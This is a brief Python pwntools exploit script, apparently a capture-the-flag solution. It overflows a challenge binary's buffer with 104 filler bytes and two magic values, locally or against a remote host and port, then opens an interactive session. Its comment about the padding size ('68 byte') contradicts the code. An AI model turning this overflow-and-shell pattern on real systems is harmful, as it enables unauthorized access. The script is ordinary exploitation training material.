from pwn import *

#        68 byte           4 byte         4 byte
PAYLOAD = b"A" * 104 + p32(0xc0d3) + p32(0xc0ff33)

def exploit_r(host_port: list):
    HOST, PORT = host_port[0], host_port[1]
    c = remote(HOST, int(PORT))
    c.recv()
    c.sendline(PAYLOAD)
    c.interactive()

def exploit_l(file: str):
    p = process(file)
    p.recv()
    p.sendline(PAYLOAD)
    p.interactive()

def main():
    import sys
    try:
        content: string = sys.argv[2]
        get_flag: bool  = True if "-flag" in sys.argv else False

        if sys.argv[1] == "-r": exploit_r(str(content).split(":"))
        if sys.argv[1] == "-l": exploit_l(content)
    except:
        print("python exploit.py -l file.out        : for locally  exploit")
        print("python exploit.py -r HOST:PORT       : for remotely exploit!")

if __name__ == "__main__":
    main()
